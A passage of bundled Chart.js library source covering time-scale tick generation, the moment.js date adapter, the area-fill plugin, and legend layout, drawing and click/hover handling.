      // PRIVATE
      me._table = [];
      me._timestamps = {
        data: timestamps,
        datasets: datasets,
        labels: labels,
      };
    },

    buildTicks: function () {
      var me = this;
      var min = me.min;
      var max = me.max;
      var options = me.options;
      var tickOpts = options.ticks;
      var timeOpts = options.time;
      var timestamps = me._timestamps;
      var ticks = [];
      var capacity = me.getLabelCapacity(min);
      var source = tickOpts.source;
      var distribution = options.distribution;
      var i, ilen, timestamp;

      if (
        source === "data" ||
        (source === "auto" && distribution === "series")
      ) {
        timestamps = timestamps.data;
      } else if (source === "labels") {
        timestamps = timestamps.labels;
      } else {
        timestamps = generate(me, min, max, capacity);
      }

      if (options.bounds === "ticks" && timestamps.length) {
        min = timestamps[0];
        max = timestamps[timestamps.length - 1];
      }

      // Enforce limits with user min/max options
      min = parse(me, getMin(options)) || min;
      max = parse(me, getMax(options)) || max;

      // Remove ticks outside the min/max range
      for (i = 0, ilen = timestamps.length; i < ilen; ++i) {
        timestamp = timestamps[i];
        if (timestamp >= min && timestamp <= max) {
          ticks.push(timestamp);
        }
      }

      me.min = min;
      me.max = max;

      // PRIVATE
      // determineUnitForFormatting relies on the number of ticks so we don't use it when
      // autoSkip is enabled because we don't yet know what the final number of ticks will be
      me._unit =
        timeOpts.unit ||
        (tickOpts.autoSkip
          ? determineUnitForAutoTicks(
              timeOpts.minUnit,
              me.min,
              me.max,
              capacity
            )
          : determineUnitForFormatting(
              me,
              ticks.length,
              timeOpts.minUnit,
              me.min,
              me.max
            ));
      me._majorUnit =
        !tickOpts.major.enabled || me._unit === "year"
          ? undefined
          : determineMajorUnit(me._unit);
      me._table = buildLookupTable(me._timestamps.data, min, max, distribution);
      me._offsets = computeOffsets(me._table, ticks, min, max, options);

      if (tickOpts.reverse) {
        ticks.reverse();
      }

      return ticksFromTimestamps(me, ticks, me._majorUnit);
    },

    getLabelForIndex: function (index, datasetIndex) {
      var me = this;
      var adapter = me._adapter;
      var data = me.chart.data;
      var timeOpts = me.options.time;
      var label =
        data.labels && index < data.labels.length ? data.labels[index] : "";
      var value = data.datasets[datasetIndex].data[index];

      if (helpers$1.isObject(value)) {
        label = me.getRightValue(value);
      }
      if (timeOpts.tooltipFormat) {
        return adapter.format(toTimestamp(me, label), timeOpts.tooltipFormat);
      }
      if (typeof label === "string") {
        return label;
      }
      return adapter.format(
        toTimestamp(me, label),
        timeOpts.displayFormats.datetime
      );
    },

    /**
     * Function to format an individual tick mark
     * @private
     */
    tickFormatFunction: function (time, index, ticks, format) {
      var me = this;
      var adapter = me._adapter;
      var options = me.options;
      var formats = options.time.displayFormats;
      var minorFormat = formats[me._unit];
      var majorUnit = me._majorUnit;
      var majorFormat = formats[majorUnit];
      var tick = ticks[index];
      var tickOpts = options.ticks;
      var major = majorUnit && majorFormat && tick && tick.major;
      var label = adapter.format(
        time,
        format ? format : major ? majorFormat : minorFormat
      );
      var nestedTickOpts = major ? tickOpts.major : tickOpts.minor;
      var formatter = resolve$5([
        nestedTickOpts.callback,
        nestedTickOpts.userCallback,
        tickOpts.callback,
        tickOpts.userCallback,
      ]);

      return formatter ? formatter(label, index, ticks) : label;
    },

    convertTicksToLabels: function (ticks) {
      var labels = [];
      var i, ilen;

      for (i = 0, ilen = ticks.length; i < ilen; ++i) {
        labels.push(this.tickFormatFunction(ticks[i].value, i, ticks));
      }

      return labels;
    },

    /**
     * @private
     */
    getPixelForOffset: function (time) {
      var me = this;
      var offsets = me._offsets;
      var pos = interpolate$1(me._table, "time", time, "pos");
      return me.getPixelForDecimal((offsets.start + pos) * offsets.factor);
    },

    getPixelForValue: function (value, index, datasetIndex) {
      var me = this;
      var time = null;

      if (index !== undefined && datasetIndex !== undefined) {
        time = me._timestamps.datasets[datasetIndex][index];
      }

      if (time === null) {
        time = parse(me, value);
      }

      if (time !== null) {
        return me.getPixelForOffset(time);
      }
    },

    getPixelForTick: function (index) {
      var ticks = this.getTicks();
      return index >= 0 && index < ticks.length
        ? this.getPixelForOffset(ticks[index].value)
        : null;
    },

    getValueForPixel: function (pixel) {
      var me = this;
      var offsets = me._offsets;
      var pos = me.getDecimalForPixel(pixel) / offsets.factor - offsets.end;
      var time = interpolate$1(me._table, "pos", pos, "time");

      // DEPRECATION, we should return time directly
      return me._adapter._create(time);
    },

    /**
     * @private
     */
    _getLabelSize: function (label) {
      var me = this;
      var ticksOpts = me.options.ticks;
      var tickLabelWidth = me.ctx.measureText(label).width;
      var angle = helpers$1.toRadians(
        me.isHorizontal() ? ticksOpts.maxRotation : ticksOpts.minRotation
      );
      var cosRotation = Math.cos(angle);
      var sinRotation = Math.sin(angle);
      var tickFontSize = valueOrDefault$d(
        ticksOpts.fontSize,
        core_defaults.global.defaultFontSize
      );

      return {
        w: tickLabelWidth * cosRotation + tickFontSize * sinRotation,
        h: tickLabelWidth * sinRotation + tickFontSize * cosRotation,
      };
    },

    /**
     * Crude approximation of what the label width might be
     * @private
     */
    getLabelWidth: function (label) {
      return this._getLabelSize(label).w;
    },

    /**
     * @private
     */
    getLabelCapacity: function (exampleTime) {
      var me = this;
      var timeOpts = me.options.time;
      var displayFormats = timeOpts.displayFormats;

      // pick the longest format (milliseconds) for guestimation
      var format = displayFormats[timeOpts.unit] || displayFormats.millisecond;
      var exampleLabel = me.tickFormatFunction(
        exampleTime,
        0,
        ticksFromTimestamps(me, [exampleTime], me._majorUnit),
        format
      );
      var size = me._getLabelSize(exampleLabel);
      var capacity = Math.floor(
        me.isHorizontal() ? me.width / size.w : me.height / size.h
      );

      if (me.options.offset) {
        capacity--;
      }

      return capacity > 0 ? capacity : 1;
    },
  });

  // INTERNAL: static default options, registered in src/index.js
  var _defaults$4 = defaultConfig$4;
  scale_time._defaults = _defaults$4;

  var scales = {
    category: scale_category,
    linear: scale_linear,
    logarithmic: scale_logarithmic,
    radialLinear: scale_radialLinear,
    time: scale_time,
  };

  var FORMATS = {
    datetime: "MMM D, YYYY, h:mm:ss a",
    millisecond: "h:mm:ss.SSS a",
    second: "h:mm:ss a",
    minute: "h:mm a",
    hour: "hA",
    day: "MMM D",
    week: "ll",
    month: "MMM YYYY",
    quarter: "[Q]Q - YYYY",
    year: "YYYY",
  };

  core_adapters._date.override(
    typeof moment === "function"
      ? {
          _id: "moment", // DEBUG ONLY

          formats: function () {
            return FORMATS;
          },

          parse: function (value, format) {
            if (typeof value === "string" && typeof format === "string") {
              value = moment(value, format);
            } else if (!(value instanceof moment)) {
              value = moment(value);
            }
            return value.isValid() ? value.valueOf() : null;
          },

          format: function (time, format) {
            return moment(time).format(format);
          },

          add: function (time, amount, unit) {
            return moment(time).add(amount, unit).valueOf();
          },

          diff: function (max, min, unit) {
            return moment(max).diff(moment(min), unit);
          },

          startOf: function (time, unit, weekday) {
            time = moment(time);
            if (unit === "isoWeek") {
              return time.isoWeekday(weekday).valueOf();
            }
            return time.startOf(unit).valueOf();
          },

          endOf: function (time, unit) {
            return moment(time).endOf(unit).valueOf();
          },

          // DEPRECATIONS

          /**
           * Provided for backward compatibility with scale.getValueForPixel().
           * @deprecated since version 2.8.0
           * @todo remove at version 3
           * @private
           */
          _create: function (time) {
            return moment(time);
          },
        }
      : {}
  );

  core_defaults._set("global", {
    plugins: {
      filler: {
        propagate: true,
      },
    },
  });

  var mappers = {
    dataset: function (source) {
      var index = source.fill;
      var chart = source.chart;
      var meta = chart.getDatasetMeta(index);
      var visible = meta && chart.isDatasetVisible(index);
      var points = (visible && meta.dataset._children) || [];
      var length = points.length || 0;

      return !length
        ? null
        : function (point, i) {
            return (i < length && points[i]._view) || null;
          };
    },

    boundary: function (source) {
      var boundary = source.boundary;
      var x = boundary ? boundary.x : null;
      var y = boundary ? boundary.y : null;

      if (helpers$1.isArray(boundary)) {
        return function (point, i) {
          return boundary[i];
        };
      }

      return function (point) {
        return {
          x: x === null ? point.x : x,
          y: y === null ? point.y : y,
        };
      };
    },
  };

  // @todo if (fill[0] === '#')
  function decodeFill(el, index, count) {
    var model = el._model || {};
    var fill = model.fill;
    var target;

    if (fill === undefined) {
      fill = !!model.backgroundColor;
    }

    if (fill === false || fill === null) {
      return false;
    }

    if (fill === true) {
      return "origin";
    }

    target = parseFloat(fill, 10);
    if (isFinite(target) && Math.floor(target) === target) {
      if (fill[0] === "-" || fill[0] === "+") {
        target = index + target;
      }

      if (target === index || target < 0 || target >= count) {
        return false;
      }

      return target;
    }

    switch (fill) {
      // compatibility
      case "bottom":
        return "start";
      case "top":
        return "end";
      case "zero":
        return "origin";
      // supported boundaries
      case "origin":
      case "start":
      case "end":
        return fill;
      // invalid fill values
      default:
        return false;
    }
  }

  function computeLinearBoundary(source) {
    var model = source.el._model || {};
    var scale = source.el._scale || {};
    var fill = source.fill;
    var target = null;
    var horizontal;

    if (isFinite(fill)) {
      return null;
    }

    // Backward compatibility: until v3, we still need to support boundary values set on
    // the model (scaleTop, scaleBottom and scaleZero) because some external plugins and
    // controllers might still use it (e.g. the Smith chart).

    if (fill === "start") {
      target =
        model.scaleBottom === undefined ? scale.bottom : model.scaleBottom;
    } else if (fill === "end") {
      target = model.scaleTop === undefined ? scale.top : model.scaleTop;
    } else if (model.scaleZero !== undefined) {
      target = model.scaleZero;
    } else if (scale.getBasePixel) {
      target = scale.getBasePixel();
    }

    if (target !== undefined && target !== null) {
      if (target.x !== undefined && target.y !== undefined) {
        return target;
      }

      if (helpers$1.isFinite(target)) {
        horizontal = scale.isHorizontal();
        return {
          x: horizontal ? target : null,
          y: horizontal ? null : target,
        };
      }
    }

    return null;
  }

  function computeCircularBoundary(source) {
    var scale = source.el._scale;
    var options = scale.options;
    var length = scale.chart.data.labels.length;
    var fill = source.fill;
    var target = [];
    var start, end, center, i, point;

    if (!length) {
      return null;
    }

    start = options.ticks.reverse ? scale.max : scale.min;
    end = options.ticks.reverse ? scale.min : scale.max;
    center = scale.getPointPositionForValue(0, start);
    for (i = 0; i < length; ++i) {
      point =
        fill === "start" || fill === "end"
          ? scale.getPointPositionForValue(i, fill === "start" ? start : end)
          : scale.getBasePosition(i);
      if (options.gridLines.circular) {
        point.cx = center.x;
        point.cy = center.y;
        point.angle = scale.getIndexAngle(i) - Math.PI / 2;
      }
      target.push(point);
    }
    return target;
  }

  function computeBoundary(source) {
    var scale = source.el._scale || {};

    if (scale.getPointPositionForValue) {
      return computeCircularBoundary(source);
    }
    return computeLinearBoundary(source);
  }

  function resolveTarget(sources, index, propagate) {
    var source = sources[index];
    var fill = source.fill;
    var visited = [index];
    var target;

    if (!propagate) {
      return fill;
    }

    while (fill !== false && visited.indexOf(fill) === -1) {
      if (!isFinite(fill)) {
        return fill;
      }

      target = sources[fill];
      if (!target) {
        return false;
      }

      if (target.visible) {
        return fill;
      }

      visited.push(fill);
      fill = target.fill;
    }

    return false;
  }

  function createMapper(source) {
    var fill = source.fill;
    var type = "dataset";

    if (fill === false) {
      return null;
    }

    if (!isFinite(fill)) {
      type = "boundary";
    }

    return mappers[type](source);
  }

  function isDrawable(point) {
    return point && !point.skip;
  }

  function drawArea(ctx, curve0, curve1, len0, len1) {
    var i, cx, cy, r;

    if (!len0 || !len1) {
      return;
    }

    // building first area curve (normal)
    ctx.moveTo(curve0[0].x, curve0[0].y);
    for (i = 1; i < len0; ++i) {
      helpers$1.canvas.lineTo(ctx, curve0[i - 1], curve0[i]);
    }

    if (curve1[0].angle !== undefined) {
      cx = curve1[0].cx;
      cy = curve1[0].cy;
      r = Math.sqrt(
        Math.pow(curve1[0].x - cx, 2) + Math.pow(curve1[0].y - cy, 2)
      );
      for (i = len1 - 1; i > 0; --i) {
        ctx.arc(cx, cy, r, curve1[i].angle, curve1[i - 1].angle, true);
      }
      return;
    }

    // joining the two area curves
    ctx.lineTo(curve1[len1 - 1].x, curve1[len1 - 1].y);

    // building opposite area curve (reverse)
    for (i = len1 - 1; i > 0; --i) {
      helpers$1.canvas.lineTo(ctx, curve1[i], curve1[i - 1], true);
    }
  }

  function doFill(ctx, points, mapper, view, color, loop) {
    var count = points.length;
    var span = view.spanGaps;
    var curve0 = [];
    var curve1 = [];
    var len0 = 0;
    var len1 = 0;
    var i, ilen, index, p0, p1, d0, d1, loopOffset;

    ctx.beginPath();

    for (i = 0, ilen = count; i < ilen; ++i) {
      index = i % count;
      p0 = points[index]._view;
      p1 = mapper(p0, index, view);
      d0 = isDrawable(p0);
      d1 = isDrawable(p1);

      if (loop && loopOffset === undefined && d0) {
        loopOffset = i + 1;
        ilen = count + loopOffset;
      }

      if (d0 && d1) {
        len0 = curve0.push(p0);
        len1 = curve1.push(p1);
      } else if (len0 && len1) {
        if (!span) {
          drawArea(ctx, curve0, curve1, len0, len1);
          len0 = len1 = 0;
          curve0 = [];
          curve1 = [];
        } else {
          if (d0) {
            curve0.push(p0);
          }
          if (d1) {
            curve1.push(p1);
          }
        }
      }
    }

    drawArea(ctx, curve0, curve1, len0, len1);

    ctx.closePath();
    ctx.fillStyle = color;
    ctx.fill();
  }

  var plugin_filler = {
    id: "filler",

    afterDatasetsUpdate: function (chart, options) {
      var count = (chart.data.datasets || []).length;
      var propagate = options.propagate;
      var sources = [];
      var meta, i, el, source;

      for (i = 0; i < count; ++i) {
        meta = chart.getDatasetMeta(i);
        el = meta.dataset;
        source = null;

        if (el && el._model && el instanceof elements.Line) {
          source = {
            visible: chart.isDatasetVisible(i),
            fill: decodeFill(el, i, count),
            chart: chart,
            el: el,
          };
        }

        meta.$filler = source;
        sources.push(source);
      }

      for (i = 0; i < count; ++i) {
        source = sources[i];
        if (!source) {
          continue;
        }

        source.fill = resolveTarget(sources, i, propagate);
        source.boundary = computeBoundary(source);
        source.mapper = createMapper(source);
      }
    },

    beforeDatasetsDraw: function (chart) {
      var metasets = chart._getSortedVisibleDatasetMetas();
      var ctx = chart.ctx;
      var meta, i, el, view, points, mapper, color;

      for (i = metasets.length - 1; i >= 0; --i) {
        meta = metasets[i].$filler;

        if (!meta || !meta.visible) {
          continue;
        }

        el = meta.el;
        view = el._view;
        points = el._children || [];
        mapper = meta.mapper;
        color = view.backgroundColor || core_defaults.global.defaultColor;

        if (mapper && color && points.length) {
          helpers$1.canvas.clipArea(ctx, chart.chartArea);
          doFill(ctx, points, mapper, view, color, el._loop);
          helpers$1.canvas.unclipArea(ctx);
        }
      }
    },
  };

  var getRtlHelper$1 = helpers$1.rtl.getRtlAdapter;
  var noop$1 = helpers$1.noop;
  var valueOrDefault$e = helpers$1.valueOrDefault;

  core_defaults._set("global", {
    legend: {
      display: true,
      position: "top",
      align: "center",
      fullWidth: true,
      reverse: false,
      weight: 1000,

      // a callback that will handle
      onClick: function (e, legendItem) {
        var index = legendItem.datasetIndex;
        var ci = this.chart;
        var meta = ci.getDatasetMeta(index);

        // See controller.isDatasetVisible comment
        meta.hidden =
          meta.hidden === null ? !ci.data.datasets[index].hidden : null;

        // We hid a dataset ... rerender the chart
        ci.update();
      },

      onHover: null,
      onLeave: null,

      labels: {
        boxWidth: 40,
        padding: 10,
        // Generates labels shown in the legend
        // Valid properties to return:
        // text : text to display
        // fillStyle : fill of coloured box
        // strokeStyle: stroke of coloured box
        // hidden : if this legend item refers to a hidden item
        // lineCap : cap style for line
        // lineDash
        // lineDashOffset :
        // lineJoin :
        // lineWidth :
        generateLabels: function (chart) {
          var datasets = chart.data.datasets;
          var options = chart.options.legend || {};
          var usePointStyle = options.labels && options.labels.usePointStyle;

          return chart._getSortedDatasetMetas().map(function (meta) {
            var style = meta.controller.getStyle(usePointStyle ? 0 : undefined);

            return {
              text: datasets[meta.index].label,
              fillStyle: style.backgroundColor,
              hidden: !chart.isDatasetVisible(meta.index),
              lineCap: style.borderCapStyle,
              lineDash: style.borderDash,
              lineDashOffset: style.borderDashOffset,
              lineJoin: style.borderJoinStyle,
              lineWidth: style.borderWidth,
              strokeStyle: style.borderColor,
              pointStyle: style.pointStyle,
              rotation: style.rotation,

              // Below is extra data used for toggling the datasets
              datasetIndex: meta.index,
            };
          }, this);
        },
      },
    },

    legendCallback: function (chart) {
      var list = document.createElement("ul");
      var datasets = chart.data.datasets;
      var i, ilen, listItem, listItemSpan;

      list.setAttribute("class", chart.id + "-legend");

      for (i = 0, ilen = datasets.length; i < ilen; i++) {
        listItem = list.appendChild(document.createElement("li"));
        listItemSpan = listItem.appendChild(document.createElement("span"));
        listItemSpan.style.backgroundColor = datasets[i].backgroundColor;
        if (datasets[i].label) {
          listItem.appendChild(document.createTextNode(datasets[i].label));
        }
      }

      return list.outerHTML;
    },
  });

  /**
   * Helper function to get the box width based on the usePointStyle option
   * @param {object} labelopts - the label options on the legend
   * @param {number} fontSize - the label font size
   * @return {number} width of the color box area
   */
  function getBoxWidth(labelOpts, fontSize) {
    return labelOpts.usePointStyle && labelOpts.boxWidth > fontSize
      ? fontSize
      : labelOpts.boxWidth;
  }

  /**
   * IMPORTANT: this class is exposed publicly as Chart.Legend, backward compatibility required!
   */
  var Legend = core_element.extend({
    initialize: function (config) {
      var me = this;
      helpers$1.extend(me, config);

      // Contains hit boxes for each dataset (in dataset order)
      me.legendHitBoxes = [];

      /**
       * @private
       */
      me._hoveredItem = null;

      // Are we in doughnut mode which has a different data type
      me.doughnutMode = false;
    },

    // These methods are ordered by lifecycle. Utilities then follow.
    // Any function defined here is inherited by all legend types.
    // Any function can be extended by the legend type

    beforeUpdate: noop$1,
    update: function (maxWidth, maxHeight, margins) {
      var me = this;

      // Update Lifecycle - Probably don't want to ever extend or overwrite this function ;)
      me.beforeUpdate();

      // Absorb the master measurements
      me.maxWidth = maxWidth;
      me.maxHeight = maxHeight;
      me.margins = margins;

      // Dimensions
      me.beforeSetDimensions();
      me.setDimensions();
      me.afterSetDimensions();
      // Labels
      me.beforeBuildLabels();
      me.buildLabels();
      me.afterBuildLabels();

      // Fit
      me.beforeFit();
      me.fit();
      me.afterFit();
      //
      me.afterUpdate();

      return me.minSize;
    },
    afterUpdate: noop$1,

    //

    beforeSetDimensions: noop$1,
    setDimensions: function () {
      var me = this;
      // Set the unconstrained dimension before label rotation
      if (me.isHorizontal()) {
        // Reset position before calculating rotation
        me.width = me.maxWidth;
        me.left = 0;
        me.right = me.width;
      } else {
        me.height = me.maxHeight;

        // Reset position before calculating rotation
        me.top = 0;
        me.bottom = me.height;
      }

      // Reset padding
      me.paddingLeft = 0;
      me.paddingTop = 0;
      me.paddingRight = 0;
      me.paddingBottom = 0;

      // Reset minSize
      me.minSize = {
        width: 0,
        height: 0,
      };
    },
    afterSetDimensions: noop$1,

    //

    beforeBuildLabels: noop$1,
    buildLabels: function () {
      var me = this;
      var labelOpts = me.options.labels || {};
      var legendItems =
        helpers$1.callback(labelOpts.generateLabels, [me.chart], me) || [];

      if (labelOpts.filter) {
        legendItems = legendItems.filter(function (item) {
          return labelOpts.filter(item, me.chart.data);
        });
      }

      if (me.options.reverse) {
        legendItems.reverse();
      }

      me.legendItems = legendItems;
    },
    afterBuildLabels: noop$1,

    //

    beforeFit: noop$1,
    fit: function () {
      var me = this;
      var opts = me.options;
      var labelOpts = opts.labels;
      var display = opts.display;

      var ctx = me.ctx;

      var labelFont = helpers$1.options._parseFont(labelOpts);
      var fontSize = labelFont.size;

      // Reset hit boxes
      var hitboxes = (me.legendHitBoxes = []);

      var minSize = me.minSize;
      var isHorizontal = me.isHorizontal();

      if (isHorizontal) {
        minSize.width = me.maxWidth; // fill all the width
        minSize.height = display ? 10 : 0;
      } else {
        minSize.width = display ? 10 : 0;
        minSize.height = me.maxHeight; // fill all the height
      }

      // Increase sizes here
      if (!display) {
        me.width = minSize.width = me.height = minSize.height = 0;
        return;
      }
      ctx.font = labelFont.string;

      if (isHorizontal) {
        // Labels

        // Width of each line of legend boxes. Labels wrap onto multiple lines when there are too many to fit on one
        var lineWidths = (me.lineWidths = [0]);
        var totalHeight = 0;

        ctx.textAlign = "left";
        ctx.textBaseline = "middle";

        helpers$1.each(me.legendItems, function (legendItem, i) {
          var boxWidth = getBoxWidth(labelOpts, fontSize);
          var width =
            boxWidth + fontSize / 2 + ctx.measureText(legendItem.text).width;

          if (
            i === 0 ||
            lineWidths[lineWidths.length - 1] + width + 2 * labelOpts.padding >
              minSize.width
          ) {
            totalHeight += fontSize + labelOpts.padding;
            lineWidths[lineWidths.length - (i > 0 ? 0 : 1)] = 0;
          }

          // Store the hitbox width and height here. Final position will be updated in `draw`
          hitboxes[i] = {
            left: 0,
            top: 0,
            width: width,
            height: fontSize,
          };

          lineWidths[lineWidths.length - 1] += width + labelOpts.padding;
        });

        minSize.height += totalHeight;
      } else {
        var vPadding = labelOpts.padding;
        var columnWidths = (me.columnWidths = []);
        var columnHeights = (me.columnHeights = []);
        var totalWidth = labelOpts.padding;
        var currentColWidth = 0;
        var currentColHeight = 0;

        helpers$1.each(me.legendItems, function (legendItem, i) {
          var boxWidth = getBoxWidth(labelOpts, fontSize);
          var itemWidth =
            boxWidth + fontSize / 2 + ctx.measureText(legendItem.text).width;

          // If too tall, go to new column
          if (
            i > 0 &&
            currentColHeight + fontSize + 2 * vPadding > minSize.height
          ) {
            totalWidth += currentColWidth + labelOpts.padding;
            columnWidths.push(currentColWidth); // previous column width
            columnHeights.push(currentColHeight);
            currentColWidth = 0;
            currentColHeight = 0;
          }

          // Get max width
          currentColWidth = Math.max(currentColWidth, itemWidth);
          currentColHeight += fontSize + vPadding;

          // Store the hitbox width and height here. Final position will be updated in `draw`
          hitboxes[i] = {
            left: 0,
            top: 0,
            width: itemWidth,
            height: fontSize,
          };
        });

        totalWidth += currentColWidth;
        columnWidths.push(currentColWidth);
        columnHeights.push(currentColHeight);
        minSize.width += totalWidth;
      }

      me.width = minSize.width;
      me.height = minSize.height;
    },
    afterFit: noop$1,

    // Shared Methods
    isHorizontal: function () {
      return (
        this.options.position === "top" || this.options.position === "bottom"
      );
    },

    // Actually draw the legend on the canvas
    draw: function () {
      var me = this;
      var opts = me.options;
      var labelOpts = opts.labels;
      var globalDefaults = core_defaults.global;
      var defaultColor = globalDefaults.defaultColor;
      var lineDefault = globalDefaults.elements.line;
      var legendHeight = me.height;
      var columnHeights = me.columnHeights;
      var legendWidth = me.width;
      var lineWidths = me.lineWidths;

      if (!opts.display) {
        return;
      }

      var rtlHelper = getRtlHelper$1(opts.rtl, me.left, me.minSize.width);
      var ctx = me.ctx;
      var fontColor = valueOrDefault$e(
        labelOpts.fontColor,
        globalDefaults.defaultFontColor
      );
      var labelFont = helpers$1.options._parseFont(labelOpts);
      var fontSize = labelFont.size;
      var cursor;

      // Canvas setup
      ctx.textAlign = rtlHelper.textAlign("left");
      ctx.textBaseline = "middle";
      ctx.lineWidth = 0.5;
      ctx.strokeStyle = fontColor; // for strikethrough effect
      ctx.fillStyle = fontColor; // render in correct colour
      ctx.font = labelFont.string;

      var boxWidth = getBoxWidth(labelOpts, fontSize);
      var hitboxes = me.legendHitBoxes;

      // current position
      var drawLegendBox = function (x, y, legendItem) {
        if (isNaN(boxWidth) || boxWidth <= 0) {
          return;
        }

        // Set the ctx for the box
        ctx.save();

        var lineWidth = valueOrDefault$e(
          legendItem.lineWidth,
          lineDefault.borderWidth
        );
        ctx.fillStyle = valueOrDefault$e(legendItem.fillStyle, defaultColor);
        ctx.lineCap = valueOrDefault$e(
          legendItem.lineCap,
          lineDefault.borderCapStyle
        );
        ctx.lineDashOffset = valueOrDefault$e(
          legendItem.lineDashOffset,
          lineDefault.borderDashOffset
        );
        ctx.lineJoin = valueOrDefault$e(
          legendItem.lineJoin,
          lineDefault.borderJoinStyle
        );
        ctx.lineWidth = lineWidth;
        ctx.strokeStyle = valueOrDefault$e(
          legendItem.strokeStyle,
          defaultColor
        );

        if (ctx.setLineDash) {
          // IE 9 and 10 do not support line dash
          ctx.setLineDash(
            valueOrDefault$e(legendItem.lineDash, lineDefault.borderDash)
          );
        }

        if (labelOpts && labelOpts.usePointStyle) {
          // Recalculate x and y for drawPoint() because its expecting
          // x and y to be center of figure (instead of top left)
          var radius = (boxWidth * Math.SQRT2) / 2;
          var centerX = rtlHelper.xPlus(x, boxWidth / 2);
          var centerY = y + fontSize / 2;

          // Draw pointStyle as legend symbol
          helpers$1.canvas.drawPoint(
            ctx,
            legendItem.pointStyle,
            radius,
            centerX,
            centerY,
            legendItem.rotation
          );
        } else {
          // Draw box as legend symbol
          ctx.fillRect(
            rtlHelper.leftForLtr(x, boxWidth),
            y,
            boxWidth,
            fontSize
          );
          if (lineWidth !== 0) {
            ctx.strokeRect(
              rtlHelper.leftForLtr(x, boxWidth),
              y,
              boxWidth,
              fontSize
            );
          }
        }

        ctx.restore();
      };

      var fillText = function (x, y, legendItem, textWidth) {
        var halfFontSize = fontSize / 2;
        var xLeft = rtlHelper.xPlus(x, boxWidth + halfFontSize);
        var yMiddle = y + halfFontSize;

        ctx.fillText(legendItem.text, xLeft, yMiddle);

        if (legendItem.hidden) {
          // Strikethrough the text if hidden
          ctx.beginPath();
          ctx.lineWidth = 2;
          ctx.moveTo(xLeft, yMiddle);
          ctx.lineTo(rtlHelper.xPlus(xLeft, textWidth), yMiddle);
          ctx.stroke();
        }
      };

      var alignmentOffset = function (dimension, blockSize) {
        switch (opts.align) {
          case "start":
            return labelOpts.padding;
          case "end":
            return dimension - blockSize;
          default: // center
            return (dimension - blockSize + labelOpts.padding) / 2;
        }
      };

      // Horizontal
      var isHorizontal = me.isHorizontal();
      if (isHorizontal) {
        cursor = {
          x: me.left + alignmentOffset(legendWidth, lineWidths[0]),
          y: me.top + labelOpts.padding,
          line: 0,
        };
      } else {
        cursor = {
          x: me.left + labelOpts.padding,
          y: me.top + alignmentOffset(legendHeight, columnHeights[0]),
          line: 0,
        };
      }

      helpers$1.rtl.overrideTextDirection(me.ctx, opts.textDirection);

      var itemHeight = fontSize + labelOpts.padding;
      helpers$1.each(me.legendItems, function (legendItem, i) {
        var textWidth = ctx.measureText(legendItem.text).width;
        var width = boxWidth + fontSize / 2 + textWidth;
        var x = cursor.x;
        var y = cursor.y;

        rtlHelper.setWidth(me.minSize.width);

        // Use (me.left + me.minSize.width) and (me.top + me.minSize.height)
        // instead of me.right and me.bottom because me.width and me.height
        // may have been changed since me.minSize was calculated
        if (isHorizontal) {
          if (
            i > 0 &&
            x + width + labelOpts.padding > me.left + me.minSize.width
          ) {
            y = cursor.y += itemHeight;
            cursor.line++;
            x = cursor.x =
              me.left + alignmentOffset(legendWidth, lineWidths[cursor.line]);
          }
        } else if (i > 0 && y + itemHeight > me.top + me.minSize.height) {
          x = cursor.x = x + me.columnWidths[cursor.line] + labelOpts.padding;
          cursor.line++;
          y = cursor.y =
            me.top + alignmentOffset(legendHeight, columnHeights[cursor.line]);
        }

        var realX = rtlHelper.x(x);

        drawLegendBox(realX, y, legendItem);

        hitboxes[i].left = rtlHelper.leftForLtr(realX, hitboxes[i].width);
        hitboxes[i].top = y;

        // Fill the actual label
        fillText(realX, y, legendItem, textWidth);

        if (isHorizontal) {
          cursor.x += width + labelOpts.padding;
        } else {
          cursor.y += itemHeight;
        }
      });

      helpers$1.rtl.restoreTextDirection(me.ctx, opts.textDirection);
    },

    /**
     * @private
     */
    _getLegendItemAt: function (x, y) {
      var me = this;
      var i, hitBox, lh;

      if (x >= me.left && x <= me.right && y >= me.top && y <= me.bottom) {
        // See if we are touching one of the dataset boxes
        lh = me.legendHitBoxes;
        for (i = 0; i < lh.length; ++i) {
          hitBox = lh[i];

          if (
            x >= hitBox.left &&
            x <= hitBox.left + hitBox.width &&
            y >= hitBox.top &&
            y <= hitBox.top + hitBox.height
          ) {
            // Touching an element
            return me.legendItems[i];
          }
        }
      }

      return null;
    },

    /**
     * Handle an event
     * @private
     * @param {IEvent} event - The event to handle
     */
    handleEvent: function (e) {
      var me = this;
      var opts = me.options;
      var type = e.type === "mouseup" ? "click" : e.type;
      var hoveredItem;

      if (type === "mousemove") {
        if (!opts.onHover && !opts.onLeave) {
          return;
        }
      } else if (type === "click") {
        if (!opts.onClick) {
          return;
        }
      } else {
        return;
      }

      // Chart event already has relative position in it
      hoveredItem = me._getLegendItemAt(e.x, e.y);

      if (type === "click") {
        if (hoveredItem && opts.onClick) {
          // use e.native for backwards compatibility
          opts.onClick.call(me, e.native, hoveredItem);
        }
      } else {
        if (opts.onLeave && hoveredItem !== me._hoveredItem) {
          if (me._hoveredItem) {
            opts.onLeave.call(me, e.native, me._hoveredItem);
          }
          me._hoveredItem = hoveredItem;
        }

        if (opts.onHover && hoveredItem) {
          // use e.native for backwards compatibility
          opts.onHover.call(me, e.native, hoveredItem);
        }
      }
    },
  });

  function createNewLegendAndAttach(chart, legendOpts) {
    var legend = new Legend({
      ctx: chart.ctx,
      options: legendOpts,
      chart: chart,
    });

    core_layouts.configure(chart, legend, legendOpts);
    core_layouts.addBox(chart, legend);
    chart.legend = legend;
  }

  var plugin_legend = {
    id: "legend",

    /**
     * Backward compatibility: since 2.1.5, the legend is registered as a plugin, making
     * Chart.Legend obsolete. To avoid a breaking change, we export the Legend as part of
     * the plugin, which one will be re-exposed in the chart.js file.
     * https://github.com/chartjs/Chart.js/pull/2640
     * @private
     */
    _element: Legend,

    beforeInit: function (chart) {
      var legendOpts = chart.options.legend;

      if (legendOpts) {
        createNewLegendAndAttach(chart, legendOpts);
      }
    },

    beforeUpdate: function (chart) {
      var legendOpts = chart.options.legend;
      var legend = chart.legend;

      if (legendOpts) {
        helpers$1.mergeIf(legendOpts, core_defaults.global.legend);

        if (legend) {
          core_layouts.configure(chart, legend, legendOpts);
          legend.options = legendOpts;
        } else {
          createNewLegendAndAttach(chart, legendOpts);
        }
      } else if (legend) {
        core_layouts.removeBox(chart, legend);
        delete chart.legend;
      }
    },

    afterEvent: function (chart, e) {
      var legend = chart.legend;
      if (legend) {
        legend.handleEvent(e);
      }
    },
  };

  var noop$2 = helpers$1.noop;

  core_defaults._set("global", {
